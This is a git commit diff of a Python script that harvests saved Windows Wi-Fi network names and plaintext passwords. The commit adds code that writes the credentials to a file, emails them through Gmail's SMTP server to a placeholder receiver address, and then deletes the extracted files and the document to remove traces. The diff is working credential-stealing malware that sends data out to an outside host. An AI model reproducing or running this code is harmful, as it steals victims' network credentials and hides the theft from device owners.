8699a3a9d9f03ccf66ce966ef78dcfbaee6ae7ab
DarkImpact1 <118814602+DarkImpact1@users.noreply.github.com>
2023-03-24 11:00:19 +0530

    updating script and confidentiality

--- script.py
+++ script.py
@@ -1,6 +1,8 @@
-import os 
-import sys
-import subprocess
+import os,subprocess,tempfile,smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.application import MIMEApplication
+
 
 def file_extractor():
     path = os.getcwd()
@@ -17,7 +19,7 @@ def append_file(path):
     return wifi_file
 
 
-def detail_extractor(file):
+def zipping_ssid_password(file):
     wifi_id=[]
     wifi_password=[]
     for sub_file in file:
@@ -31,26 +33,85 @@ def detail_extractor(file):
                     line.strip()
                     password = line[17:-15]
                     wifi_password.append(password)
-    main_file = zip(wifi_id,wifi_password)
-    return main_file
+    zip_file = zip(wifi_id,wifi_password)
+    return zip_file
+
 
 def make_doc(zip_file):
+    path = os.getcwd()
+    for file in os.listdir(path):
+        if file.startswith("confidential") and file.endswith(".txt"):
+            os.remove(path+"\\"+file)
+    
     for id,pwd in zip_file:
-        sys.stdout = open("confidential.txt","a")
-        print(f"SSID: {id} --------------- Password: {pwd}")
-    sys.stdout = sys.__stdout__
+        with open("confidential.txt","a") as doc:
+            doc.write(f"SSID: {id} --------------- Password: {pwd}\n")
+    
+    return doc.name
 
 
+def send_email(document):
+    # Sender and receiver information
+    sender_email = "sender's mail"
+    sender_password = "password"
+    receiver_email = "reciever's mail"
+
+    # Create a message object
+    message = MIMEMultipart()
+    message["From"] = sender_email
+    message["To"] = receiver_email
+    message["Subject"] = "Email with Attachment"
+
+    # Add body text to the email
+    body = "This email contains an attachment."
+    message.attach(MIMEText(body, "plain"))
+
+    # Attach the file to the email
+    filename = document
+    with open(filename, "rb") as f:
+        attachment = MIMEApplication(f.read(), _subtype="txt")
+        attachment.add_header("Content-Disposition", "attachment", filename=filename)
+        message.attach(attachment)
+
+    try:
+        # Create the SMTP server and login
+        smtp_server = "smtp.gmail.com"
+        smtp_port = 587
+        server = smtplib.SMTP(smtp_server, smtp_port)
+        server.starttls()
+        server.login(sender_email, sender_password)
+
+        # Send the email and close the connection
+        text = message.as_string()
+        server.sendmail(sender_email, receiver_email, text)
+
+    except Exception as e:
+        print(e)
+
+    finally:
+        server.quit()
+
+# deleting all the extracted file 
 def delete_files(path):
     os.chdir(path)
     for file in os.listdir(path):
         if file.startswith("Wi-Fi") and file.endswith(".xml"):
             os.remove(path+"\\"+file)
-    print("done")
+
 
 if __name__=="__main__":
+    # changing directory to temp directory now every action will be perform in temp directory
+    temp_directory = tempfile.gettempdir()
+    os.chdir(temp_directory)
     path = file_extractor()
     list_wifi = append_file(path)
-    zip_file = detail_extractor(list_wifi)
-    make_doc(zip_file)
+    zip_file = zipping_ssid_password(list_wifi)
+    # making document of extracted ssid and password
+    document = make_doc(zip_file)
+    # getting the file via mail
+    send_email(document)
+    # deleting extracted file after extracting ssid and password
     delete_files(path)
+    # finnaly removing document 
+    os.remove(document)
+    
